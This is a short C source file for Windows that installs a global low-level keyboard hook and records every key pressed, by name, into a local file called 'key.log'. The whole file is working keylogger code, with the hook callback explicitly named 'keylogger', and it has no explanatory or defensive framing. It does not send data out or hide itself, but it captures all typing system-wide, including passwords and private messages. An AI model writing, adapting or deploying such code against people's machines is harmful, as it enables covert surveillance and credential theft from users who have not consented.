#include <stdio.h>
#include <Windows.h>
#include <winuser.h>
#include <stdbool.h>

HHOOK hookHandle;
FILE* fp;

LRESULT CALLBACK keylogger(
	_In_ int    nCode,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
) {
	KBDLLHOOKSTRUCT kbdStruct;
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			WCHAR keyText[1024];
			DWORD msg = 1;
			msg += kbdStruct.scanCode << 16;

			int result = GetKeyNameText(msg, keyText, sizeof(keyText) / sizeof(WCHAR));
			if (result > 0) {
				size_t keyTextLen = wcslen(keyText);
				if (keyTextLen == 0) {
					fprintf(fp, "[virtual key code: %d]", kbdStruct.vkCode);
				} else if (keyTextLen == 1) {
					fprintf(fp, "%ls", keyText);
				}
				else {
					fprintf(fp, "[%ls]", keyText);
				}
			}
		}
	}

	return CallNextHookEx(hookHandle, nCode, wParam, lParam);
};

void main() {
	errno_t err = fopen_s(&fp, "key.log", "w");
	if (err != 0) {
		printf("Error while opening log file %d", err);
		return;
	}

	hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, &keylogger, NULL, 0);
	
	MSG msg;
	bool bRet;
	while (bRet = GetMessage(&msg, NULL, 0, 0)) {
		if (bRet) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	};
}
// winmain
// write to a file